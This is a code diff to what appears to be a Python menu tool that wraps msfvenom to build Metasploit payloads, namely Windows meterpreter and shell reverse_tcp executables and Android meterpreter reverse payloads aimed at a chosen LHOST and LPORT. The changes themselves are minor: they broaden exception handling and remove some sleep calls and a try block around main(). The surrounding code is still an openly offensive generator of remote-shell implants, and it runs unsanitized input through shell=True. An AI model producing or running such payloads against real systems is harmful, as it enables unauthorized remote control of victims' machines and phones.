@@ -80,7 +80,7 @@ def payloadgen1(payload, talkback, lhost, lport, outfile):
 def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
     try:
         subprocess.run(f"msfvenom {args1} -p {payloadandsession} LHOST={lhost} LPORT={lport} {args2} -o {outfile}", check=True,shell=True)   
-    except subprocess.CalledProcessError:
+    except:
         print(colorama.Fore.LIGHTRED_EX +  "An error has occured! Please read the above output and make sure you entered the options properly!" + colorama.Style.RESET_ALL)
     else: 
         print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {outfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)  
@@ -180,13 +180,11 @@ def winpayload():
     if inputwin == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
-        time.sleep(2)
         menu()
     #WinShell    
     if inputwin == "2":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
-        time.sleep(2)    
 
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
@@ -205,7 +203,6 @@ def androidpayload():
     if inputy == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
-        time.sleep(2)
         menu()
 
     else:
@@ -254,15 +251,4 @@ def main():
     time.sleep(0.1)
     menu()
 colorama.init()    
-try:
-     main()
-except:
-    print(colorama.Fore.RED + "Whoops an error was encountered!" + colorama.Style.RESET_ALL)
-
-
-    
-
-
-
-
-                                                               
+main()                                                          
